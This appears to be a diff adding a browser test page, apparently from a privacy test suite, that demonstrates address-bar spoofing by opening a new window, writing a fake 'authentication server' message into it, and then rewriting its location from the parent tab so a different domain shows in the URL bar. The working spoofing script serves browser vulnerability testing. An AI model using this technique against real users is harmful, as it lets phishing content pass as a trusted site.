@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <title>URL Spoofing - New Window Rewrite</title>
+    <script>
+        let w;
+        let t;
+        function newWindow() {
+            w = window.open("", "", "");
+            w.document.write(`<body onblur="document.body.innerHTML='<h2>Your address bar has been spoofed. This is not https://broken.third-party.site</h2>'"><h2>There was a problem communicating with drive authentication server, please switch to previous tabs. Do not close this window, closing this window will cancel current download.</h2></body>`);
+        }
+
+        function spoof() {
+            w.location.href = 'https://broken.third-party.site/';
+            var i = setInterval(function () {
+                try {
+                    w.location.href;
+                } catch (e) {
+                    w.location.href = 'https://broken.third-party.site/security/address-bar-spoofing/no-content';
+                    clearInterval(i);
+                }
+            }, 1);
+        }
+    </script>
+</head>
+
+<body>
+    <p><a href="./index.html">[Back]</a></p>
+
+    This test will try to confuse the browser to show the wrong domain in the URL bar by opening a new window
+    and then rewriting the location of the new window from the parent. The new window will show a message that 
+    the address bar has been spoofed. Tap "New Window", then return to this tab, and tap "Spoof" to see the
+    address bar change to "https://broken.third-party.site". If it doesn't show as such, the browser is not
+    vulnerable to this attack. Note: this won't work if run from broken.third-party.site. Ensure it is run from 
+    another origin such as https://privacy-test-pages.site.
+
+    
+    <button onclick="newWindow()">New Window</button>
+    <button onclick="spoof()">Spoof</button>
+</body>
+
+</html>
